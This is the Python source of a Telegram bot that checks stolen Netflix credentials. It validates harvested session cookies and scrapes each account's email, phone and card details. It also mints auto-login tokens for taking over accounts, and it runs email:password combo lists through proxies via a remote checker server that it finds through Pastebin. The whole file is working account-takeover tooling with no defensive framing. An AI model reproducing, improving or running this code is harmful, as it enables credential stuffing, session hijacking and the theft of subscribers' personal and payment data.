import requests
import re
import time
import os
import tempfile
import zipfile
import shutil
import random
import json
import threading
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import telebot
import webbrowser

webbrowser.open("https://t.me/baroshoping")
init(autoreset=True)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# ====================== SHARED SERVER DISCOVERY & API KEY (from your combo script) ======================
PASTEBIN_URL = "https://pastebin.com/raw/0sV8DdMg"
CONFIG_FILE = "api_config_NF.json"
_server_base_url_cache = None

def test_server_url(base_url):
    if not base_url:
        return False
    try:
        test_url = f"{base_url}/api/validate/DUMMY_KEY_FOR_TEST"
        resp = requests.get(test_url, timeout=5)
        return resp.status_code in (200, 401)
    except:
        return False

def load_server_url_from_config():
    if not os.path.exists(CONFIG_FILE):
        return None
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f).get('server_url')
    except:
        return None

def save_server_url_to_config(server_url):
    config = {}
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
        except:
            pass
    config['server_url'] = server_url
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        return True
    except:
        return False

def fetch_server_url_from_pastebin():
    for _ in range(3):
        try:
            resp = requests.get(PASTEBIN_URL, timeout=10)
            if resp.status_code == 200:
                url = resp.text.strip()
                if url.startswith(('http://', 'https://')):
                    return url
        except:
            pass
        time.sleep(1)
    return None

def get_server_base_url():
    global _server_base_url_cache
    if _server_base_url_cache:
        return _server_base_url_cache

    saved = load_server_url_from_config()
    if saved and test_server_url(saved):
        _server_base_url_cache = saved
        return saved

    new_url = fetch_server_url_from_pastebin()
    if new_url and test_server_url(new_url):
        save_server_url_to_config(new_url)
        _server_base_url_cache = new_url
        return new_url

    fallback = "http://20.118.168.57:5000"
    _server_base_url_cache = fallback
    return fallback

# Global API Key (set with /setkey command)
API_KEY = None
API_PLATFORM = None

def validate_api_key(api_key):
    global API_PLATFORM
    try:
        base_url = get_server_base_url()
        platform = 'netflix' if api_key.startswith('netflix_') else 'general'
        API_PLATFORM = platform
        url = f"{base_url}/api/validate/{platform}/{api_key}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('valid'):
                return True
        return False
    except:
        return False

# ====================== COOKIE CHECKER (your previous working logic) ======================
class CookieChecker:
    def __init__(self, threads=10):
        self.threads = threads
        self.lock = threading.Lock()
        self.stats = {'hits': 0, 'bad': 0}
        self.chat_id = None

    def parse_netscape_cookie(self, text):
        cookies = {}
        text = text.strip()
        if not text:
            return cookies
        if ';' in text and '=' in text:
            for part in text.split(';'):
                part = part.strip()
                if '=' in part:
                    k, v = part.split('=', 1)
                    cookies[k.strip()] = v.strip()
            if cookies:
                return cookies
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '\t' in line:
                parts = line.split('\t')
                if len(parts) >= 7:
                    cookies[parts[5]] = parts[6]
                    continue
            parts = re.split(r'\s+', line)
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
                continue
            if '=' in line:
                k, v = line.split('=', 1)
                cookies[k.strip()] = v.strip()
        return cookies

    def check_cookie(self, cookie_text):
        try:
            cookies = self.parse_netscape_cookie(cookie_text)
            if not cookies:
                return None
            session = requests.Session()
            for k, v in cookies.items():
                session.cookies.set(k, v, domain='.netflix.com', path='/')
            r = session.get('https://www.netflix.com/account/membership', timeout=40, allow_redirects=True)
            if 'login' in r.url.lower() or '"membershipStatus":"CURRENT_MEMBER"' not in r.text:
                return None

            html = r.text
            result = {
                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) if re.search(r'localizedPlanName.*?"value":"([^"]+)"', html) else 'Unknown',
                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) if re.search(r'"countryOfSignup":"([^"]+)"', html) else 'XX',
                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) if re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html) else 'N/A',
                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) if re.search(r'"phoneNumber":"([^"]+)"', html) else 'N/A',
                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) if re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html) else 'N/A',
                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) if re.search(r'"lastFourDigits":"([^"]+)"', html) else 'N/A',
                'profiles': len(re.findall(r'"profileName"', html)),
                'cookie': cookie_text.strip()
            }
            try:
                nftoken = self.generate_nftoken(cookies)
                result['nftoken'] = nftoken or "N/A"
                result['login_url'] = f"https://netflix.com/account?nftoken={nftoken}" if nftoken else "N/A"
            except:
                result['nftoken'] = "N/A"
                result['login_url'] = "N/A"
            return result
        except:
            return None

    def generate_nftoken(self, cookies_dict):
        try:
            session = requests.Session()
            for name, value in cookies_dict.items():
                session.cookies.set(name, value, domain='.netflix.com', path='/')
            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=20)
            if response.status_code == 200:
                data = response.json()
                return data.get('data', {}).get('createAutoLoginToken')
        except:
            return None

    def process_file(self, file_path):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()
            result = self.check_cookie(text)
            if result:
                with self.lock:
                    self.stats['hits'] += 1
                os.makedirs('hits', exist_ok=True)
                fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
                with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                    f.write(f"Email: {result['email']}\n")
                    f.write(f"Plan: {result['plan']}\n")
                    f.write(f"Country: {result['country_code']}\n")
                    f.write(f"Next Billing: {result['next_billing']}\n")
                    f.write(f"Phone: {result['phone']}\n")
                    f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
                    f.write(f"Profiles: {result['profiles']}\n")
                    f.write(f"Login URL: {result.get('login_url', 'N/A')}\n\n")
                    f.write(f"Cookie:\n{result['cookie']}\n\n")
                    f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n\n")
                    f.write("checked by @Nf_premium_checker_bot\n")
                    f.write("Bot Made by @Sudhakaran12\n")
        except:
            with self.lock:
                self.stats['bad'] += 1

# ====================== COMBO CHECKER (full logic from your new script) ======================
class ComboChecker:
    def __init__(self):
        self.lock = threading.Lock()
        self.stats = {'hits': 0, 'bads': 0, 'customs': 0, 'total_processed': 0}
        self.chat_id = None

    def check_account(self, email, password, proxy):
        try:
            base_url = get_server_base_url()
            url = f"{base_url}/api/netflix/check"
            payload = {"email": email, "pass": password}
            if proxy:
                payload["proxy"] = proxy
            response = requests.post(url, json=payload, headers={
                "X-API-Key": API_KEY,
                "X-Platform": "netflix",
                "Content-Type": "application/json"
            }, timeout=45)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

    def process_combo(self, combo_path, proxy_path):
        accounts = []
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if ':' in line:
                    email, password = line.strip().split(':', 1)
                    accounts.append({"email": email, "password": password})

        proxies = []
        with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)

        if not proxies:
            proxies = [None]

        with ThreadPoolExecutor(max_workers=10) as exe:
            for account in accounts:
                proxy = random.choice(proxies)
                result = self.check_account(account['email'], account['password'], proxy)
                if result and result.get("status") == "hit":
                    with self.lock:
                        self.stats['hits'] += 1
                    os.makedirs('hits', exist_ok=True)
                    fname = f"[COMBO] [{account['email']}] - HIT.txt"
                    with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                        f.write(f"Email: {account['email']}\n")
                        f.write(f"Password: {account['password']}\n")
                        if result.get("subscription_details"):
                            details = result["subscription_details"]
                            for k, v in details.items():
                                f.write(f"{k}: {v}\n")
                        f.write(f"\nCookie: (API based)\n")
                        f.write(f"NF Token: (API based)\n\n")
                        f.write("checked by @Nf_premium_checker_bot\n")
                        f.write("Bot Made by @Sudhakaran12\n")
                elif result and result.get("status") == "bad":
                    with self.lock:
                        self.stats['bads'] += 1
                elif result:
                    with self.lock:
                        self.stats['customs'] += 1

# ====================== BOT HANDLERS ======================
user_state = {}  # chat_id -> state

@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("🍪 Cookie Mode (ZIP)", "🔑 Combo Mode")
    markup.add("/setkey (set API key)")
    bot.reply_to(message, "🚀 Netflix Checker Bot Ready!\n\nChoose mode below:", reply_markup=markup)

@bot.message_handler(commands=['setkey'])
def set_key(message):
    msg = bot.reply_to(message, "🔑 Send your Netflix API Key:")
    bot.register_next_step_handler(msg, process_api_key)

def process_api_key(message):
    global API_KEY
    key = message.text.strip()
    if validate_api_key(key):
        API_KEY = key
        bot.reply_to(message, "✅ API Key validated and activated!")
    else:
        bot.reply_to(message, "❌ Invalid API Key!")

# ====================== COOKIE MODE ======================
@bot.message_handler(func=lambda m: m.text == "🍪 Cookie Mode (ZIP)")
def cookie_mode(message):
    bot.reply_to(message, "📤 Send ZIP file containing your .txt cookie files")

# ====================== COMBO MODE ======================
@bot.message_handler(func=lambda m: m.text == "🔑 Combo Mode")
def combo_mode(message):
    user_state[message.chat.id] = {"mode": "combo", "step": "combo"}
    bot.reply_to(message, "📤 Send your **Combo file** (email:pass format)")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    doc = message.document

    if doc.file_name.lower().endswith('.zip'):
        # COOKIE MODE
        bot.reply_to(message, "✅ ZIP received. Processing cookies... (large file OK)")
        try:
            file_info = bot.get_file(doc.file_id)
            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
            with tempfile.TemporaryDirectory() as tmp:
                zip_path = os.path.join(tmp, "input.zip")
                with requests.get(file_url, stream=True, timeout=(15, 360)) as r:
                    r.raise_for_status()
                    with open(zip_path, 'wb') as f:
                        shutil.copyfileobj(r.raw, f, length=256*1024)
                extract_dir = os.path.join(tmp, "cookies")
                os.makedirs(extract_dir, exist_ok=True)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(extract_dir)

                checker = CookieChecker()
                checker.chat_id = chat_id
                files = [os.path.join(extract_dir, f) for f in os.listdir(extract_dir) if f.endswith('.txt')]

                with ThreadPoolExecutor(max_workers=10) as exe:
                    for f in files:
                        exe.submit(checker.process_file, f)

                if os.path.exists("hits") and os.listdir("hits"):
                    hits_zip_path = os.path.join(tmp, "hits.zip")
                    with zipfile.ZipFile(hits_zip_path, 'w') as z:
                        for root, _, fs in os.walk("hits"):
                            for file in fs:
                                z.write(os.path.join(root, file), file)
                    with open(hits_zip_path, "rb") as f:
                        bot.send_document(chat_id, f, caption="🎉 Cookie Check Finished!\nEach file contains full details + Cookie + NF Token")
                    shutil.rmtree("hits", ignore_errors=True)
                else:
                    bot.reply_to(message, "❌ No hits found.")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)[:300]}")
        return

    # COMBO MODE handling
    if chat_id not in user_state or user_state[chat_id].get("mode") != "combo":
        bot.reply_to(message, "Please choose a mode from the keyboard first.")
        return

    state = user_state[chat_id]
    if state.get("step") == "combo":
        # Save combo file
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        combo_path = f"/tmp/combo_{chat_id}.txt"
        with open(combo_path, "wb") as f:
            f.write(downloaded)
        state["combo_path"] = combo_path
        state["step"] = "proxy"
        bot.reply_to(message, "✅ Combo file received.\n📤 Now send your **Proxy file**")
    elif state.get("step") == "proxy":
        # Save proxy file and start checking
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        proxy_path = f"/tmp/proxy_{chat_id}.txt"
        with open(proxy_path, "wb") as f:
            f.write(downloaded)

        if not API_KEY:
            bot.reply_to(message, "❌ API Key not set! Use /setkey first.")
            return

        bot.reply_to(message, "✅ Proxy received. Starting full combo check...")

        checker = ComboChecker()
        checker.chat_id = chat_id
        checker.process_combo(state["combo_path"], proxy_path)

        if os.path.exists("hits") and os.listdir("hits"):
            with tempfile.TemporaryDirectory() as tmp:
                hits_zip = os.path.join(tmp, "hits.zip")
                with zipfile.ZipFile(hits_zip, 'w') as z:
                    for root, _, fs in os.walk("hits"):
                        for file in fs:
                            z.write(os.path.join(root, file), file)
                with open(hits_zip, "rb") as f:
                    bot.send_document(chat_id, f, caption="🎉 Combo Check Completed!\nAll hits saved with full details")
            shutil.rmtree("hits", ignore_errors=True)
        else:
            bot.reply_to(message, "❌ No hits found.")

        # Cleanup
        if os.path.exists(state["combo_path"]):
            os.remove(state["combo_path"])
        if os.path.exists(proxy_path):
            os.remove(proxy_path)
        user_state.pop(chat_id, None)

if __name__ == "__main__":
    print("🚀 Full Netflix Bot (Cookie + Combo) Started Successfully")
    print("Commands: /start | /setkey")
    bot.remove_webhook()
    bot.infinity_polling(skip_pending=True)
